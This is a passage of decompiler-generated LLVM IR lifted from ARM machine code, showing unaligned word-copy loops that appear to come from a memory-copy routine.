dec_label_pc_1b2fc:                               ; preds = %dec_label_pc_1b220, %dec_label_pc_1b2f4
  %v0_1b41c75 = phi i32 [ %v1_1b200, %dec_label_pc_1b220 ], [ %v0_1b41c76, %dec_label_pc_1b2f4 ]
  %v0_1b384 = phi i32 [ %v2_1b210, %dec_label_pc_1b220 ], [ %v2_1b2ec, %dec_label_pc_1b2f4 ]
  %v0_1b304.off0 = phi i2 [ %extract.t, %dec_label_pc_1b220 ], [ %extract.t130, %dec_label_pc_1b2f4 ]
  %v0_1b2fc = phi i32 [ %v0_1b200, %dec_label_pc_1b220 ], [ %v0_1b2f4, %dec_label_pc_1b2f4 ]
  %v1_1b2fc = and i32 %v0_1b2fc, -4
  store i32 %v1_1b2fc, i32* %r1.global-to-local, align 4
  %v1_1b300 = inttoptr i32 %v1_1b2fc to i32*
  %v2_1b300 = load i32, i32* %v1_1b300, align 4
  store i32 %v2_1b300, i32* %lr.global-to-local, align 4
  %v4_1b300 = add i32 %v1_1b2fc, 4
  store i32 %v4_1b300, i32* %r1.global-to-local, align 4
  %v1_1b37c = add i32 %v0_1b384, -12
  %v3_1b37c = sub i32 11, %v0_1b384
  %v4_1b37c = and i32 %v3_1b37c, %v0_1b384
  %v5_1b37c = icmp slt i32 %v4_1b37c, 0
  store i1 %v5_1b37c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b37c = icmp slt i32 %v1_1b37c, 0
  store i1 %v6_1b37c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b37c = icmp eq i32 %v0_1b384, 12
  store i1 %v7_1b37c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b380 = xor i1 %v6_1b37c, %v5_1b37c
  switch i2 %v0_1b304.off0, label %dec_label_pc_1b310 [
    i2 -1, label %dec_label_pc_1b3e8
    i2 -2, label %dec_label_pc_1b37c
  ]

dec_label_pc_1b310:                               ; preds = %dec_label_pc_1b2fc
  br i1 %v2_1b380, label %dec_label_pc_1b35c, label %dec_label_pc_1b318

dec_label_pc_1b318:                               ; preds = %dec_label_pc_1b310
  store i32 %v1_1b37c, i32* %r2.global-to-local, align 4
  %v3_1b31c = load i32, i32* @r4, align 4
  store i32 %v3_1b31c, i32* %stack_var_-16, align 4
  %v6_1b31c = load i32, i32* @r5, align 4
  store i32 %v6_1b31c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b320

dec_label_pc_1b320:                               ; preds = %dec_label_pc_1b320.dec_label_pc_1b320_crit_edge, %dec_label_pc_1b318
  %v0_1b344 = phi i32 [ %v12_1b344, %dec_label_pc_1b320.dec_label_pc_1b320_crit_edge ], [ %v0_1b41c75, %dec_label_pc_1b318 ]
  %v0_1b324 = phi i32 [ %v0_1b324.pre, %dec_label_pc_1b320.dec_label_pc_1b320_crit_edge ], [ %v4_1b300, %dec_label_pc_1b318 ]
  %v0_1b320 = phi i32 [ %v0_1b320.pre, %dec_label_pc_1b320.dec_label_pc_1b320_crit_edge ], [ %v2_1b300, %dec_label_pc_1b318 ]
  %v3_1b320 = udiv i32 %v0_1b320, 256
  %v1_1b324 = inttoptr i32 %v0_1b324 to i32*
  %v2_1b324 = load i32, i32* %v1_1b324, align 4
  store i32 %v2_1b324, i32* %r4.global-to-local, align 4
  %v3_1b324 = add i32 %v0_1b324, 4
  %v4_1b324 = inttoptr i32 %v3_1b324 to i32*
  %v5_1b324 = load i32, i32* %v4_1b324, align 4
  store i32 %v5_1b324, i32* %r5.global-to-local, align 4
  %v6_1b324 = add i32 %v0_1b324, 8
  %v7_1b324 = inttoptr i32 %v6_1b324 to i32*
  %v8_1b324 = load i32, i32* %v7_1b324, align 4
  store i32 %v8_1b324, i32* %ip.global-to-local, align 4
  %v9_1b324 = add i32 %v0_1b324, 12
  %v10_1b324 = inttoptr i32 %v9_1b324 to i32*
  %v11_1b324 = load i32, i32* %v10_1b324, align 4
  store i32 %v11_1b324, i32* %lr.global-to-local, align 4
  %v12_1b324 = add i32 %v0_1b324, 16
  store i32 %v12_1b324, i32* %r1.global-to-local, align 4
  %v4_1b328 = mul i32 %v2_1b324, 16777216
  %v5_1b328 = or i32 %v4_1b328, %v3_1b320
  store i32 %v5_1b328, i32* @r3, align 4
  %v3_1b32c = udiv i32 %v2_1b324, 256
  %v4_1b330 = mul i32 %v5_1b324, 16777216
  %v5_1b330 = or i32 %v4_1b330, %v3_1b32c
  store i32 %v5_1b330, i32* %r4.global-to-local, align 4
  %v3_1b334 = udiv i32 %v5_1b324, 256
  %v4_1b338 = mul i32 %v8_1b324, 16777216
  %v5_1b338 = or i32 %v4_1b338, %v3_1b334
  store i32 %v5_1b338, i32* %r5.global-to-local, align 4
  %v3_1b33c = udiv i32 %v8_1b324, 256
  %v4_1b340 = mul i32 %v11_1b324, 16777216
  %v5_1b340 = or i32 %v4_1b340, %v3_1b33c
  store i32 %v5_1b340, i32* @ip, align 4
  %v1_1b344 = inttoptr i32 %v0_1b344 to i32*
  store i32 %v5_1b328, i32* %v1_1b344, align 4
  %v3_1b344 = add i32 %v0_1b344, 4
  %v4_1b344 = inttoptr i32 %v3_1b344 to i32*
  %v5_1b344 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b344, i32* %v4_1b344, align 4
  %v6_1b344 = add i32 %v0_1b344, 8
  %v7_1b344 = inttoptr i32 %v6_1b344 to i32*
  %v8_1b344 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1b344, i32* %v7_1b344, align 4
  %v9_1b344 = add i32 %v0_1b344, 12
  %v10_1b344 = inttoptr i32 %v9_1b344 to i32*
  %v11_1b344 = load i32, i32* @ip, align 4
  store i32 %v11_1b344, i32* %v10_1b344, align 4
  %v12_1b344 = add i32 %v0_1b344, 16
  store i32 %v12_1b344, i32* %r0.global-to-local, align 4
  %v0_1b348 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b348 = add i32 %v0_1b348, -16
  store i32 %v1_1b348, i32* %r2.global-to-local, align 4
  %v3_1b348 = sub i32 15, %v0_1b348
  %v4_1b348 = and i32 %v3_1b348, %v0_1b348
  %v5_1b348 = icmp slt i32 %v4_1b348, 0
  %v6_1b348 = icmp slt i32 %v1_1b348, 0
  %v2_1b34c = xor i1 %v6_1b348, %v5_1b348
  br i1 %v2_1b34c, label %dec_label_pc_1b350, label %dec_label_pc_1b320.dec_label_pc_1b320_crit_edge

dec_label_pc_1b320.dec_label_pc_1b320_crit_edge:  ; preds = %dec_label_pc_1b320
  %v0_1b320.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1b324.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b320

dec_label_pc_1b350:                               ; preds = %dec_label_pc_1b320
  %v2_1b350 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b350, i32* @r4, align 4
  %v5_1b350 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1b350, i32* @r5, align 4
  %v1_1b354 = add i32 %v0_1b348, -4
  store i32 %v1_1b354, i32* %r2.global-to-local, align 4
  %v3_1b354 = add i32 %v0_1b348, 2147483632
  %v4_1b354 = and i32 %v1_1b354, %v3_1b354
  %v5_1b354 = icmp slt i32 %v4_1b354, 0
  store i1 %v5_1b354, i1* %cpsr_v.global-to-local, align 1
  %v6_1b354 = icmp slt i32 %v1_1b354, 0
  store i1 %v6_1b354, i1* %cpsr_n.global-to-local, align 1
  %v7_1b354 = icmp eq i32 %v1_1b354, 0
  store i1 %v7_1b354, i1* %cpsr_z.global-to-local, align 1
  %v2_1b358 = xor i1 %v6_1b354, %v5_1b354
  br i1 %v2_1b358, label %dec_label_pc_1b374, label %dec_label_pc_1b35c

dec_label_pc_1b35c:                               ; preds = %dec_label_pc_1b350, %dec_label_pc_1b310, %dec_label_pc_1b35c
  %v1_1b368 = phi i32 [ %v4_1b368, %dec_label_pc_1b35c ], [ %v12_1b344, %dec_label_pc_1b350 ], [ %v0_1b41c75, %dec_label_pc_1b310 ]
  %v0_1b35c = load i32, i32* %lr.global-to-local, align 4
  %v3_1b35c = udiv i32 %v0_1b35c, 256
  store i32 %v3_1b35c, i32* %ip.global-to-local, align 4
  %v0_1b360 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b360 = inttoptr i32 %v0_1b360 to i32*
  %v2_1b360 = load i32, i32* %v1_1b360, align 4
  store i32 %v2_1b360, i32* %lr.global-to-local, align 4
  %v4_1b360 = add i32 %v0_1b360, 4
  store i32 %v4_1b360, i32* %r1.global-to-local, align 4
  %v4_1b364 = mul i32 %v2_1b360, 16777216
  %v5_1b364 = or i32 %v4_1b364, %v3_1b35c
  store i32 %v5_1b364, i32* @ip, align 4
  %v2_1b368 = inttoptr i32 %v1_1b368 to i32*
  store i32 %v5_1b364, i32* %v2_1b368, align 4
  %v3_1b368 = load i32, i32* %r0.global-to-local, align 4
  %v4_1b368 = add i32 %v3_1b368, 4
  store i32 %v4_1b368, i32* %r0.global-to-local, align 4
  %v0_1b36c = load i32, i32* %r2.global-to-local, align 4
  %v1_1b36c = add i32 %v0_1b36c, -4
  store i32 %v1_1b36c, i32* %r2.global-to-local, align 4
  %v3_1b36c = sub i32 3, %v0_1b36c
  %v4_1b36c = and i32 %v3_1b36c, %v0_1b36c
  %v5_1b36c = icmp slt i32 %v4_1b36c, 0
  %v6_1b36c = icmp slt i32 %v1_1b36c, 0
  %v2_1b370 = xor i1 %v6_1b36c, %v5_1b36c
  br i1 %v2_1b370, label %dec_label_pc_1b374.loopexit, label %dec_label_pc_1b35c

dec_label_pc_1b374.loopexit:                      ; preds = %dec_label_pc_1b35c
  %v7_1b36c = icmp eq i32 %v0_1b36c, 4
  store i1 %v5_1b36c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1b36c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1b36c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b374

dec_label_pc_1b374:                               ; preds = %dec_label_pc_1b374.loopexit, %dec_label_pc_1b350
  %v0_1b29c58 = phi i32 [ %v1_1b36c, %dec_label_pc_1b374.loopexit ], [ %v1_1b354, %dec_label_pc_1b350 ]
  %v0_1b374 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b374 = add i32 %v0_1b374, -3
  store i32 %v1_1b374, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1b37c:                               ; preds = %dec_label_pc_1b2fc
  br i1 %v2_1b380, label %dec_label_pc_1b3c8, label %dec_label_pc_1b384

dec_label_pc_1b384:                               ; preds = %dec_label_pc_1b37c
  store i32 %v1_1b37c, i32* %r2.global-to-local, align 4
  %v3_1b388 = load i32, i32* @r4, align 4
  store i32 %v3_1b388, i32* %stack_var_-16, align 4
  %v6_1b388 = load i32, i32* @r5, align 4
  store i32 %v6_1b388, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b38c

dec_label_pc_1b38c:                               ; preds = %dec_label_pc_1b38c.dec_label_pc_1b38c_crit_edge, %dec_label_pc_1b384
  %v0_1b3b0 = phi i32 [ %v12_1b3b0, %dec_label_pc_1b38c.dec_label_pc_1b38c_crit_edge ], [ %v0_1b41c75, %dec_label_pc_1b384 ]
  %v0_1b390 = phi i32 [ %v0_1b390.pre, %dec_label_pc_1b38c.dec_label_pc_1b38c_crit_edge ], [ %v4_1b300, %dec_label_pc_1b384 ]
  %v0_1b38c = phi i32 [ %v0_1b38c.pre, %dec_label_pc_1b38c.dec_label_pc_1b38c_crit_edge ], [ %v2_1b300, %dec_label_pc_1b384 ]
  %v3_1b38c = udiv i32 %v0_1b38c, 65536
  %v1_1b390 = inttoptr i32 %v0_1b390 to i32*
  %v2_1b390 = load i32, i32* %v1_1b390, align 4
  store i32 %v2_1b390, i32* %r4.global-to-local, align 4
  %v3_1b390 = add i32 %v0_1b390, 4
  %v4_1b390 = inttoptr i32 %v3_1b390 to i32*
  %v5_1b390 = load i32, i32* %v4_1b390, align 4
  store i32 %v5_1b390, i32* %r5.global-to-local, align 4
  %v6_1b390 = add i32 %v0_1b390, 8
  %v7_1b390 = inttoptr i32 %v6_1b390 to i32*
  %v8_1b390 = load i32, i32* %v7_1b390, align 4
  store i32 %v8_1b390, i32* %ip.global-to-local, align 4
  %v9_1b390 = add i32 %v0_1b390, 12
  %v10_1b390 = inttoptr i32 %v9_1b390 to i32*
  %v11_1b390 = load i32, i32* %v10_1b390, align 4
  store i32 %v11_1b390, i32* %lr.global-to-local, align 4
  %v12_1b390 = add i32 %v0_1b390, 16
  store i32 %v12_1b390, i32* %r1.global-to-local, align 4
  %v4_1b394 = mul i32 %v2_1b390, 65536
  %v5_1b394 = or i32 %v4_1b394, %v3_1b38c
  store i32 %v5_1b394, i32* @r3, align 4
  %v3_1b398 = udiv i32 %v2_1b390, 65536
  %v4_1b39c = mul i32 %v5_1b390, 65536
  %v5_1b39c = or i32 %v4_1b39c, %v3_1b398
  store i32 %v5_1b39c, i32* %r4.global-to-local, align 4
  %v3_1b3a0 = udiv i32 %v5_1b390, 65536
  %v4_1b3a4 = mul i32 %v8_1b390, 65536
  %v5_1b3a4 = or i32 %v4_1b3a4, %v3_1b3a0
  store i32 %v5_1b3a4, i32* %r5.global-to-local, align 4
  %v3_1b3a8 = udiv i32 %v8_1b390, 65536
  %v4_1b3ac = mul i32 %v11_1b390, 65536
  %v5_1b3ac = or i32 %v4_1b3ac, %v3_1b3a8
  store i32 %v5_1b3ac, i32* @ip, align 4
  %v1_1b3b0 = inttoptr i32 %v0_1b3b0 to i32*
  store i32 %v5_1b394, i32* %v1_1b3b0, align 4
  %v3_1b3b0 = add i32 %v0_1b3b0, 4
  %v4_1b3b0 = inttoptr i32 %v3_1b3b0 to i32*
  %v5_1b3b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b3b0, i32* %v4_1b3b0, align 4
  %v6_1b3b0 = add i32 %v0_1b3b0, 8
  %v7_1b3b0 = inttoptr i32 %v6_1b3b0 to i32*
  %v8_1b3b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1b3b0, i32* %v7_1b3b0, align 4
  %v9_1b3b0 = add i32 %v0_1b3b0, 12
  %v10_1b3b0 = inttoptr i32 %v9_1b3b0 to i32*
  %v11_1b3b0 = load i32, i32* @ip, align 4
  store i32 %v11_1b3b0, i32* %v10_1b3b0, align 4
  %v12_1b3b0 = add i32 %v0_1b3b0, 16
  store i32 %v12_1b3b0, i32* %r0.global-to-local, align 4
  %v0_1b3b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3b4 = add i32 %v0_1b3b4, -16
  store i32 %v1_1b3b4, i32* %r2.global-to-local, align 4
  %v3_1b3b4 = sub i32 15, %v0_1b3b4
  %v4_1b3b4 = and i32 %v3_1b3b4, %v0_1b3b4
  %v5_1b3b4 = icmp slt i32 %v4_1b3b4, 0
  %v6_1b3b4 = icmp slt i32 %v1_1b3b4, 0
  %v2_1b3b8 = xor i1 %v6_1b3b4, %v5_1b3b4
  br i1 %v2_1b3b8, label %dec_label_pc_1b3bc, label %dec_label_pc_1b38c.dec_label_pc_1b38c_crit_edge

dec_label_pc_1b38c.dec_label_pc_1b38c_crit_edge:  ; preds = %dec_label_pc_1b38c
  %v0_1b38c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1b390.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b38c

dec_label_pc_1b3bc:                               ; preds = %dec_label_pc_1b38c
  %v2_1b3bc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b3bc, i32* @r4, align 4
  %v5_1b3bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1b3bc, i32* @r5, align 4
  %v1_1b3c0 = add i32 %v0_1b3b4, -4
  store i32 %v1_1b3c0, i32* %r2.global-to-local, align 4
  %v3_1b3c0 = add i32 %v0_1b3b4, 2147483632
  %v4_1b3c0 = and i32 %v1_1b3c0, %v3_1b3c0
  %v5_1b3c0 = icmp slt i32 %v4_1b3c0, 0
  store i1 %v5_1b3c0, i1* %cpsr_v.global-to-local, align 1
  %v6_1b3c0 = icmp slt i32 %v1_1b3c0, 0
  store i1 %v6_1b3c0, i1* %cpsr_n.global-to-local, align 1
  %v7_1b3c0 = icmp eq i32 %v1_1b3c0, 0
  store i1 %v7_1b3c0, i1* %cpsr_z.global-to-local, align 1
  %v2_1b3c4 = xor i1 %v6_1b3c0, %v5_1b3c0
  br i1 %v2_1b3c4, label %dec_label_pc_1b3e0, label %dec_label_pc_1b3c8

dec_label_pc_1b3c8:                               ; preds = %dec_label_pc_1b3bc, %dec_label_pc_1b37c, %dec_label_pc_1b3c8
  %v1_1b3d4 = phi i32 [ %v4_1b3d4, %dec_label_pc_1b3c8 ], [ %v12_1b3b0, %dec_label_pc_1b3bc ], [ %v0_1b41c75, %dec_label_pc_1b37c ]
  %v0_1b3c8 = load i32, i32* %lr.global-to-local, align 4
  %v3_1b3c8 = udiv i32 %v0_1b3c8, 65536
  store i32 %v3_1b3c8, i32* %ip.global-to-local, align 4
  %v0_1b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3cc = inttoptr i32 %v0_1b3cc to i32*
  %v2_1b3cc = load i32, i32* %v1_1b3cc, align 4
  store i32 %v2_1b3cc, i32* %lr.global-to-local, align 4
  %v4_1b3cc = add i32 %v0_1b3cc, 4
  store i32 %v4_1b3cc, i32* %r1.global-to-local, align 4
  %v4_1b3d0 = mul i32 %v2_1b3cc, 65536
  %v5_1b3d0 = or i32 %v4_1b3d0, %v3_1b3c8
  store i32 %v5_1b3d0, i32* @ip, align 4
  %v2_1b3d4 = inttoptr i32 %v1_1b3d4 to i32*
  store i32 %v5_1b3d0, i32* %v2_1b3d4, align 4
  %v3_1b3d4 = load i32, i32* %r0.global-to-local, align 4
  %v4_1b3d4 = add i32 %v3_1b3d4, 4
  store i32 %v4_1b3d4, i32* %r0.global-to-local, align 4
  %v0_1b3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b3d8 = add i32 %v0_1b3d8, -4
  store i32 %v1_1b3d8, i32* %r2.global-to-local, align 4
  %v3_1b3d8 = sub i32 3, %v0_1b3d8
  %v4_1b3d8 = and i32 %v3_1b3d8, %v0_1b3d8
  %v5_1b3d8 = icmp slt i32 %v4_1b3d8, 0
  %v6_1b3d8 = icmp slt i32 %v1_1b3d8, 0
  %v2_1b3dc = xor i1 %v6_1b3d8, %v5_1b3d8
  br i1 %v2_1b3dc, label %dec_label_pc_1b3e0.loopexit, label %dec_label_pc_1b3c8

dec_label_pc_1b3e0.loopexit:                      ; preds = %dec_label_pc_1b3c8
  %v7_1b3d8 = icmp eq i32 %v0_1b3d8, 4
  store i1 %v5_1b3d8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1b3d8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1b3d8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b3e0

dec_label_pc_1b3e0:                               ; preds = %dec_label_pc_1b3e0.loopexit, %dec_label_pc_1b3bc
  %v0_1b29c59 = phi i32 [ %v1_1b3d8, %dec_label_pc_1b3e0.loopexit ], [ %v1_1b3c0, %dec_label_pc_1b3bc ]
  %v0_1b3e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3e0 = add i32 %v0_1b3e0, -2
  store i32 %v1_1b3e0, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1b3e8:                               ; preds = %dec_label_pc_1b2fc
  br i1 %v2_1b380, label %dec_label_pc_1b434, label %dec_label_pc_1b3f0

dec_label_pc_1b3f0:                               ; preds = %dec_label_pc_1b3e8
  store i32 %v1_1b37c, i32* %r2.global-to-local, align 4
  %v3_1b3f4 = load i32, i32* @r4, align 4
  store i32 %v3_1b3f4, i32* %stack_var_-16, align 4
  %v6_1b3f4 = load i32, i32* @r5, align 4
  store i32 %v6_1b3f4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1b3f8

dec_label_pc_1b3f8:                               ; preds = %dec_label_pc_1b3f8.dec_label_pc_1b3f8_crit_edge, %dec_label_pc_1b3f0
  %v0_1b41c = phi i32 [ %v12_1b41c, %dec_label_pc_1b3f8.dec_label_pc_1b3f8_crit_edge ], [ %v0_1b41c75, %dec_label_pc_1b3f0 ]
  %v0_1b3fc = phi i32 [ %v0_1b3fc.pre, %dec_label_pc_1b3f8.dec_label_pc_1b3f8_crit_edge ], [ %v4_1b300, %dec_label_pc_1b3f0 ]
  %v0_1b3f8 = phi i32 [ %v0_1b3f8.pre, %dec_label_pc_1b3f8.dec_label_pc_1b3f8_crit_edge ], [ %v2_1b300, %dec_label_pc_1b3f0 ]
  %v3_1b3f8 = udiv i32 %v0_1b3f8, 16777216
  %v1_1b3fc = inttoptr i32 %v0_1b3fc to i32*
  %v2_1b3fc = load i32, i32* %v1_1b3fc, align 4
  store i32 %v2_1b3fc, i32* %r4.global-to-local, align 4
  %v3_1b3fc = add i32 %v0_1b3fc, 4
  %v4_1b3fc = inttoptr i32 %v3_1b3fc to i32*
  %v5_1b3fc = load i32, i32* %v4_1b3fc, align 4
  store i32 %v5_1b3fc, i32* %r5.global-to-local, align 4
  %v6_1b3fc = add i32 %v0_1b3fc, 8
  %v7_1b3fc = inttoptr i32 %v6_1b3fc to i32*
  %v8_1b3fc = load i32, i32* %v7_1b3fc, align 4
  store i32 %v8_1b3fc, i32* %ip.global-to-local, align 4
  %v9_1b3fc = add i32 %v0_1b3fc, 12
  %v10_1b3fc = inttoptr i32 %v9_1b3fc to i32*
  %v11_1b3fc = load i32, i32* %v10_1b3fc, align 4
  store i32 %v11_1b3fc, i32* %lr.global-to-local, align 4
  %v12_1b3fc = add i32 %v0_1b3fc, 16
  store i32 %v12_1b3fc, i32* %r1.global-to-local, align 4
  %v4_1b400 = mul i32 %v2_1b3fc, 256
  %v5_1b400 = or i32 %v4_1b400, %v3_1b3f8
  store i32 %v5_1b400, i32* @r3, align 4
  %v3_1b404 = udiv i32 %v2_1b3fc, 16777216
  %v4_1b408 = mul i32 %v5_1b3fc, 256
  %v5_1b408 = or i32 %v4_1b408, %v3_1b404
  store i32 %v5_1b408, i32* %r4.global-to-local, align 4
  %v3_1b40c = udiv i32 %v5_1b3fc, 16777216
  %v4_1b410 = mul i32 %v8_1b3fc, 256
  %v5_1b410 = or i32 %v4_1b410, %v3_1b40c
  store i32 %v5_1b410, i32* %r5.global-to-local, align 4
  %v3_1b414 = udiv i32 %v8_1b3fc, 16777216
  %v4_1b418 = mul i32 %v11_1b3fc, 256
  %v5_1b418 = or i32 %v4_1b418, %v3_1b414
  store i32 %v5_1b418, i32* @ip, align 4
  %v1_1b41c = inttoptr i32 %v0_1b41c to i32*
  store i32 %v5_1b400, i32* %v1_1b41c, align 4
  %v3_1b41c = add i32 %v0_1b41c, 4
  %v4_1b41c = inttoptr i32 %v3_1b41c to i32*
  %v5_1b41c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b41c, i32* %v4_1b41c, align 4
  %v6_1b41c = add i32 %v0_1b41c, 8
  %v7_1b41c = inttoptr i32 %v6_1b41c to i32*
  %v8_1b41c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1b41c, i32* %v7_1b41c, align 4
  %v9_1b41c = add i32 %v0_1b41c, 12
  %v10_1b41c = inttoptr i32 %v9_1b41c to i32*
  %v11_1b41c = load i32, i32* @ip, align 4
  store i32 %v11_1b41c, i32* %v10_1b41c, align 4
  %v12_1b41c = add i32 %v0_1b41c, 16
  store i32 %v12_1b41c, i32* %r0.global-to-local, align 4
  %v0_1b420 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b420 = add i32 %v0_1b420, -16
  store i32 %v1_1b420, i32* %r2.global-to-local, align 4
  %v3_1b420 = sub i32 15, %v0_1b420
  %v4_1b420 = and i32 %v3_1b420, %v0_1b420
  %v5_1b420 = icmp slt i32 %v4_1b420, 0
  %v6_1b420 = icmp slt i32 %v1_1b420, 0
  %v2_1b424 = xor i1 %v6_1b420, %v5_1b420
  br i1 %v2_1b424, label %dec_label_pc_1b428, label %dec_label_pc_1b3f8.dec_label_pc_1b3f8_crit_edge

dec_label_pc_1b3f8.dec_label_pc_1b3f8_crit_edge:  ; preds = %dec_label_pc_1b3f8
  %v0_1b3f8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1b3fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b3f8

dec_label_pc_1b428:                               ; preds = %dec_label_pc_1b3f8
  %v2_1b428 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b428, i32* @r4, align 4
  %v5_1b428 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1b428, i32* @r5, align 4
  %v1_1b42c = add i32 %v0_1b420, -4
  store i32 %v1_1b42c, i32* %r2.global-to-local, align 4
  %v3_1b42c = add i32 %v0_1b420, 2147483632
  %v4_1b42c = and i32 %v1_1b42c, %v3_1b42c
  %v5_1b42c = icmp slt i32 %v4_1b42c, 0
  store i1 %v5_1b42c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b42c = icmp slt i32 %v1_1b42c, 0
  store i1 %v6_1b42c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b42c = icmp eq i32 %v1_1b42c, 0
  store i1 %v7_1b42c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b430 = xor i1 %v6_1b42c, %v5_1b42c
  br i1 %v2_1b430, label %dec_label_pc_1b44c, label %dec_label_pc_1b434

dec_label_pc_1b434:                               ; preds = %dec_label_pc_1b428, %dec_label_pc_1b3e8, %dec_label_pc_1b434
  %v1_1b440 = phi i32 [ %v4_1b440, %dec_label_pc_1b434 ], [ %v12_1b41c, %dec_label_pc_1b428 ], [ %v0_1b41c75, %dec_label_pc_1b3e8 ]
  %v0_1b434 = load i32, i32* %lr.global-to-local, align 4
  %v3_1b434 = udiv i32 %v0_1b434, 16777216
  store i32 %v3_1b434, i32* %ip.global-to-local, align 4
  %v0_1b438 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b438 = inttoptr i32 %v0_1b438 to i32*
  %v2_1b438 = load i32, i32* %v1_1b438, align 4
  store i32 %v2_1b438, i32* %lr.global-to-local, align 4
  %v4_1b438 = add i32 %v0_1b438, 4
  store i32 %v4_1b438, i32* %r1.global-to-local, align 4
  %v4_1b43c = mul i32 %v2_1b438, 256
  %v5_1b43c = or i32 %v4_1b43c, %v3_1b434
  store i32 %v5_1b43c, i32* @ip, align 4
  %v2_1b440 = inttoptr i32 %v1_1b440 to i32*
  store i32 %v5_1b43c, i32* %v2_1b440, align 4
  %v3_1b440 = load i32, i32* %r0.global-to-local, align 4
  %v4_1b440 = add i32 %v3_1b440, 4
  store i32 %v4_1b440, i32* %r0.global-to-local, align 4
  %v0_1b444 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b444 = add i32 %v0_1b444, -4
  store i32 %v1_1b444, i32* %r2.global-to-local, align 4
  %v3_1b444 = sub i32 3, %v0_1b444
  %v4_1b444 = and i32 %v3_1b444, %v0_1b444
  %v5_1b444 = icmp slt i32 %v4_1b444, 0
  %v6_1b444 = icmp slt i32 %v1_1b444, 0
  %v2_1b448 = xor i1 %v6_1b444, %v5_1b444
  br i1 %v2_1b448, label %dec_label_pc_1b44c.loopexit, label %dec_label_pc_1b434

dec_label_pc_1b44c.loopexit:                      ; preds = %dec_label_pc_1b434
  %v7_1b444 = icmp eq i32 %v0_1b444, 4
  store i1 %v5_1b444, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1b444, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1b444, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b44c

dec_label_pc_1b44c:                               ; preds = %dec_label_pc_1b44c.loopexit, %dec_label_pc_1b428
  %v0_1b29c60 = phi i32 [ %v1_1b444, %dec_label_pc_1b44c.loopexit ], [ %v1_1b42c, %dec_label_pc_1b428 ]
  %v0_1b44c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b44c = add i32 %v0_1b44c, -1
  store i32 %v1_1b44c, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1b454:                               ; preds = %entry
  %v1_1b454 = load i32, i32* @r2, align 4
  %v2_1b454 = add i32 %v1_1b454, %v0_1b200
  store i32 %v2_1b454, i32* %r1.global-to-local, align 4
  %v2_1b458 = add i32 %v1_1b454, %v1_1b200
  store i32 %v2_1b458, i32* %r0.global-to-local, align 4
  %v2_1b45c = add i32 %v1_1b454, -4
  store i32 %v2_1b45c, i32* %r2.global-to-local, align 4
  %v4_1b45c = sub i32 3, %v1_1b454
  %v5_1b45c = and i32 %v4_1b45c, %v1_1b454
  %v6_1b45c = icmp slt i32 %v5_1b45c, 0
  store i1 %v6_1b45c, i1* %cpsr_v.global-to-local, align 1
  %v7_1b45c = icmp slt i32 %v2_1b45c, 0
  store i1 %v7_1b45c, i1* %cpsr_n.global-to-local, align 1
  %v8_1b45c = icmp eq i32 %v1_1b454, 4
  store i1 %v8_1b45c, i1* %cpsr_z.global-to-local, align 1
  %v5_1b460 = icmp slt i32 %v1_1b454, 4
  br i1 %v5_1b460, label %bb150, label %dec_label_pc_1b464

dec_label_pc_1b464:                               ; preds = %dec_label_pc_1b454
  %v1_1b464 = urem i32 %v2_1b458, 4
  store i32 %v1_1b464, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b464 = icmp eq i32 %v1_1b464, 0
  store i1 %v2_1b464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b464, label %dec_label_pc_1b46c, label %dec_label_pc_1b50c

dec_label_pc_1b46c:                               ; preds = %dec_label_pc_1b464
  %v1_1b46c = urem i32 %v2_1b454, 4
  store i32 %v1_1b46c, i32* @ip, align 4
